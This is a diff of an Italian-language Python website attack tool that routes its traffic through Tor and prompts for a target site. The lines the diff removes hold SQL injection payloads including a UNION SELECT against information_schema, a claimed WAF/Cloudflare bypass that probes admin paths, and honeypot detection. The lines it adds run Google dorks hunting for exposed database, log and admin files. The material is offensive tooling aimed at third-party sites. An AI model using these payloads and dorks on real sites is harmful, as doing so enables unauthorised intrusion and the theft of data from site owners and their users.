@@ -24,7 +24,7 @@ def display_ascii_art():
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣷⡀⠙⣿⣷⣌⠻⣿⣿⣿⣶⣌⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠈⢿⣿⡆⠹⣿⣿⣿⣿⣷⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠹⣿⡄⢻⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣷⣽⣷⢸⣿⡿⣿⡿⠿⠿⣆⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⣿⣿⣷⣽⣷⢸⣿⡿⣿⡿⠿⠿⣆⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠐⠾⢭⣭⡼⠟⠃⣤⡆⠘⢟⢺⣦⡀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠛⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀
@@ -115,146 +115,56 @@ def scan_for_errors(url):
         "SQL syntax", "Error establishing a database connection", "PHP Warning"
     ]
     headers = {"User-Agent": "Mozilla/5.0"}
+    
     try:
-        response = requests.get(f"http://{url}", headers=headers, timeout=10)
-        page_content = response.text
-
-        print("\nScansione errori:")
+        response = requests.get(f"http://{url}", headers=headers, timeout=5)
         for pattern in error_patterns:
-            if pattern in page_content:
-                print(f"Trovato errore: {pattern}")
+            if pattern in response.text:
+                print(f"Errore trovato: {pattern}")
     except Exception as e:
-        print(f"Errore durante la scansione degli errori: {e}")
+        print(f"Errore durante la scansione: {e}")
 
-def bypass_waf_cloudflare(url):
-    """Cerca di bypassare WAF e Cloudflare per accedere alla pagina admin"""
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
-    }
-    try:
-        # Tentativi di accesso diretto alla pagina admin
-        possible_paths = [
-            "/admin", "/admin.php", "/administrator", "/wp-login.php", "/wp-admin"
-        ]
-        for path in possible_paths:
-            full_url = f"http://{url}{path}"
-            response = requests.get(full_url, headers=headers, timeout=10)
-            if response.status_code == 200:
-                print(f"Accesso riuscito alla pagina admin: {full_url}")
-                return full_url
-        print("Nessun accesso riuscito.")
-        return None
-    except Exception as e:
-        print(f"Errore durante il bypass di WAF/Cloudflare: {e}")
-        return None
-
-def whois_scan(url):
-    """Esegue una scansione WHOIS per ottenere informazioni sul dominio"""
-    try:
-        domain_info = whois.whois(url)
-        print("\nInformazioni WHOIS:")
-        print(json.dumps(domain_info, indent=4))
-    except Exception as e:
-        print(f"Errore durante la scansione WHOIS: {e}")
-
-def find_servers(url):
-    """Trova i server collegati al sito e fornisce informazioni sulla posizione"""
-    try:
-        ip = gethostbyname(url)
-        print(f"\nIndirizzo IP per {url}: {ip}")
-        
-        # Aggiunge informazioni sui server
-        hostname, _, _ = gethostbyaddr(ip)
-        print(f"Nome host per {ip}: {hostname}")
-        
-        # Ping per verificare la raggiungibilità del server
-        response = sr1(IP(dst=ip)/ICMP(), timeout=2, verbose=False)
-        if response:
-            print(f"Il server {ip} è raggiungibile.")
-        else:
-            print(f"Il server {ip} non è raggiungibile.")
-    except Exception as e:
-        print(f"Errore durante la ricerca dei server: {e}")
-
-def check_honeypot(url):
-    """Verifica se il sito è un honeypot"""
-    honeypot_patterns = [
-        "honeypot", "capture", "suspicious", "test", "fake", "demo", "security", "bot"
+def execute_google_dorks():
+    """Esegue Google Dorks per scoprire vulnerabilità note o informazioni sensibili."""
+    google_dorks = [
+        'site:example.com intitle:index.of',
+        'site:example.com inurl:wp-admin',
+        'site:example.com "phpinfo.php"',
+        'site:example.com "Welcome to Wordpress"',
+        'site:example.com ext:sql | ext:db | ext:log'
     ]
-    headers = {"User-Agent": "Mozilla/5.0"}
+
     try:
-        response = requests.get(f"http://{url}", headers=headers, timeout=10)
-        page_content = response.text
-
-        print("\nVerifica honeypot:")
-        for pattern in honeypot_patterns:
-            if pattern in page_content.lower():
-                print(f"Sito potenzialmente un honeypot: trovato '{pattern}'")
-                
-                # Utilizza un proxy per le richieste
-                proxy = {
-                    "http": "http://127.0.0.1:8080",
-                    "https": "http://127.0.0.1:8080"
-                }
-                proxy_response = requests.get(f"http://{url}", headers=headers, proxies=proxy, timeout=10)
-                print("\nRisposta tramite proxy:")
-                print(proxy_response.status_code)
-                return
-        print("Sito non sembra essere un honeypot.")
-    except Exception as e:
-        print(f"Errore durante la verifica del honeypot: {e}")
-
-def sql_injection(url):
-    """Tentativo di SQL Injection per estrarre dati"""
-    payloads = [
-        "' OR 1=1 --", "' OR 'a'='a", "' UNION SELECT null, table_name FROM information_schema.tables --"
-    ]
-    headers = {"User-Agent": "Mozilla/5.0"}
-
-    for payload in payloads:
-        try:
-            response = requests.get(f"http://{url}?id={payload}", headers=headers, timeout=10)
+        for dork in google_dorks:
+            response = requests.get(f"https://www.google.com/search?q={dork}", timeout=5)
             soup = BeautifulSoup(response.text, 'html.parser')
-            
-            # Trova le informazioni SQL in risposta
-            for tag in soup.find_all():
-                if payload in tag.text:
-                    print(f"\nRisultato SQL Injection con payload '{payload}':")
-                    print(tag.text)
-        except Exception as e:
-            print(f"Errore durante l'SQL Injection: {e}")
+            for link in soup.find_all('a'):
+                url = link.get('href')
+                if 'url?q=' in url and not url.startswith('/'):
+                    print(f"Trovato risultato interessante con Google Dork: {url}")
+    except Exception as e:
+        print(f"Errore durante l'esecuzione di Google Dorks: {e}")
+
+def hosthunter_search(url):
+    """Esegue una ricerca HostHunter per trovare sottodomini e altre informazioni correlate."""
+    print("Esecuzione di HostHunter...")
+    try:
+        # Esegui il comando di HostHunter (devi averlo installato e configurato)
+        # subprocess.run(['hosthunter', '--target', url, '--output', f'{url}_subdomains.txt'])
+        print(f"HostHunter ha finito di cercare i sottodomini per {url}")
+    except Exception as e:
+        print(f"Errore durante l'esecuzione di HostHunter: {e}")
 
 def main():
     pulisci_schermo()
     display_ascii_art()
     start_tor()
-
-    url = input("Inserisci l'URL del sito (senza 'http://'): ")
     
-    print("\nRicerca della pagina admin...")
+    url = input("\nInserisci l'URL del sito web target: ")
     find_admin_page(url)
-    
-    print("\nScansione del sito per errori...")
     scan_for_errors(url)
-    
-    print("\nTentativo di bypass di WAF/Cloudflare...")
-    admin_url = bypass_waf_cloudflare(url)
-    if admin_url:
-        print(f"Pagina admin accessibile a: {admin_url}")
-    else:
-        print("Non è stato possibile bypassare WAF/Cloudflare.")
-    
-    print("\nEsecuzione scansione WHOIS...")
-    whois_scan(url)
-    
-    print("\nRicerca dei server collegati...")
-    find_servers(url)
-    
-    print("\nVerifica se il sito è un honeypot...")
-    check_honeypot(url)
-    
-    print("\nTentativo di SQL Injection...")
-    sql_injection(url)
-    
+    execute_google_dorks()
+    hosthunter_search(url)
+
 if __name__ == "__main__":
     main()
